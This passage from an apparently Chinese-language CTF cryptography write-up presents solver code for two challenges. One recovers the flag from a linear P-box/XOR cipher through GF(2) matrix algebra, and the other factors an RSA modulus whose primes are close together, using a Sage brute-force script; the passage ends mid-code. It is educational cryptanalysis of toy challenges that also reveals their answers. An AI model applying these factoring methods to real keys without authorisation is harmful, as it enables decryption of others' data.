<span class="number">15</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">30</span>]]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">v</span>):</span></span><br><span class="line">    t=v</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line">       q=[]</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> Pbox:</span><br><span class="line">           q.append(<span class="built_in">sum</span>([t[k] <span class="keyword">for</span> k <span class="keyword">in</span> j])%<span class="number">2</span>)</span><br><span class="line">       t=[<span class="built_in">int</span>(q[j])^<span class="built_in">int</span>(i[j]) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag)==<span class="number">32</span>)</span><br><span class="line">fb=<span class="built_in">bin</span>(bytes_to_long(flag))[<span class="number">2</span>:].zfill(<span class="number">32</span>*<span class="number">8</span>)</span><br><span class="line">ciphertext=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(fb),<span class="number">32</span>):</span><br><span class="line">    t=enc([<span class="built_in">int</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> fb[i:i+<span class="number">32</span>]])</span><br><span class="line">    ciphertext+=<span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> t])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>代码逻辑：将flag二进制32*8位01串分为8组，每一组都先经过P盒按位选择求和运算，再与未知的32位key进行按位异或运算，因为有6组key，上述两步运算循环进行6次操作，得到最终32位密文。</p><p>将加密过程转为 $\text{GF}(2)$ 下的矩阵运算，$M_i$ 为 1x32 明文矩阵 $(0 \le i \lt 8)$，$P$ 为 32x32 P盒矩阵，$K_i$ 为 1x32 key矩阵 $(0 \le i \lt 6)$，$T_i$ 为中间矩阵 $(0 \le i \lt 6)$，$C$ 为密文矩阵，即：</p><p>$T_0=M_i$</p><p>$T_1=T_0P^{-1}+K_0$</p><p>$T_2=T_1P^{-1}+K_1$</p><p>$T_3=T_2P^{-1}+K_2$</p><p>$T_4=T_3P^{-1}+K_3$</p><p>$T_5=T_4P^{-1}+K_4$</p><p>$T_6=T_5P^{-1}+K_5=C$</p><p>可得：</p><p>$C=T_6=M_i(P^{-1})^{6}+K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$</p><p>由于 $K_i$ 和 $P$ 都固定，令 $A=(P^{-1})^{6},B=K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$，</p><p>有 $C=M_iA+B$，其中 $A,B$ 都为固定值，$A$ 可求，$B$ 未知。</p><p>猜测 $M_0$ 对应的明文是 <code>flag</code>，则由 $M_0,C_0$可以得出 $B$，再对 $C_1$ 至 $C_5$ 分别求逆运算可得 $M_1$ 至 $M_5$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">P = [</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">30</span>]]</span><br><span class="line"></span><br><span class="line">PP = zero_matrix(GF(<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    PP[k] = [<span class="number">1</span> <span class="keyword">if</span> x <span class="keyword">in</span> P[k] <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">PPt = PP.transpose()</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100&#x27;</span></span><br><span class="line">C = zero_matrix(GF(<span class="number">2</span>),<span class="number">8</span>,<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">32</span>):</span><br><span class="line">    C[k//<span class="number">32</span>] = [<span class="number">1</span> <span class="keyword">if</span> x == <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> c[k:k+<span class="number">32</span>]]</span><br><span class="line"><span class="built_in">print</span>(C)</span><br><span class="line"></span><br><span class="line">f0 = vector(GF(<span class="number">2</span>),<span class="built_in">list</span>(<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">b&#x27;flag&#x27;</span>.<span class="built_in">hex</span>(),<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">4</span>*<span class="number">8</span>)))</span><br><span class="line">flag = <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line">tmp = C[<span class="number">0</span>] - (f0*(PPt^<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    l = <span class="built_in">list</span>((C[k]-tmp)*PPt^(-<span class="number">6</span>))</span><br><span class="line">    flag += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> l]),<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;P_has_no_Semantic_Security&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="中学数学"><a href="#中学数学" class="headerlink" title="中学数学"></a>中学数学</h3><blockquote><p>本题flag格式: flag{xxx}</p><p>Zuni: 听说密码学是小学数学来着？</p><p>// 随缘评：真的吗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">q=next_prime(p+(p&gt;&gt;<span class="number">500</span>))</span><br><span class="line"></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= 13776679754786305830793674359562910178503525293501875259698297791987196248336062506951151345232816992904634767521007443634017633687862289928715870204388479258679577315915061740028494078672493226329115247979108035669870651598111762906959057540508657823948600824548819666985698501483261504641066030188603032714383272686110228221709062681957025702835354151145335986966796484545336983392388743498515384930244837403932600464428196236533563039992819408281355416477094656741439388971695931526610641826910750926961557362454734732247864647404836037293509009829775634926600458845832805085222154851310850740227722601054242115507</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c= 6253975396639688013947622483271226838902346034187241970785550830715516801386404802832796746428068354515287579293520381463797045055114065533348514688044281004266071342722261719304097175009672596062130939189624163728328429608123325223000160428261082507446604698345173189268359115612698883860396660563679801383563588818099088505120717238037463747828729693649297904035253985982099474025883550074375828799938384533606092448272306356003096283602697757642323962299153853559914553690456801745940925602411053578841756504799815771173679267389055390097241148454899265156705442028845650177138185876173539754631720573266723359186</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>$p,q$ 接近，且前1024-500位相同，有 $\sqrt{n}&gt;&gt;500 \approx p&gt;&gt;500 \approx q-p$，故可爆破找差值 $k$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">f1, f2</span>):</span></span><br><span class="line">g = f1.resultant(f2, q)</span><br><span class="line">roots = g.univariate_polynomial().roots()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(roots) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">p_ = <span class="built_in">abs</span>(roots[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">q_ = <span class="built_in">abs</span>(roots[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">min</span>(p_, q_), <span class="built_in">max</span>(p_, q_))</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">x = <span class="built_in">int</span>(gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">xh = x &gt;&gt; <span class="number">500</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> trange(<span class="number">1000000</span>,<span class="number">10000000</span>):</span><br><span class="line">    d = xh - k</span><br><span class="line">    P.&lt;p, q&gt; = PolynomialRing(ZZ)</span><br><span class="line">    f1 = n - p*q</span><br><span class="line">    f2 = d - (q - p)</span><br><span class="line">    res = solve(f1, f2)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 5476332</span></span><br><span class="line"><span class="comment"># (117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171074427891089886767667348073044876487630536209840494632852807000951512126317010773423294553929289375585831391437922887752426888245829185481732564145862194694837, 117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171110284932237912222026220958706260216927350725324469350893507592837055161338352274913301924684983498346654165295930055956026431077232360603315231271970883987911)</span></span><br></pre></td></tr></table></figure><p>再常规解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 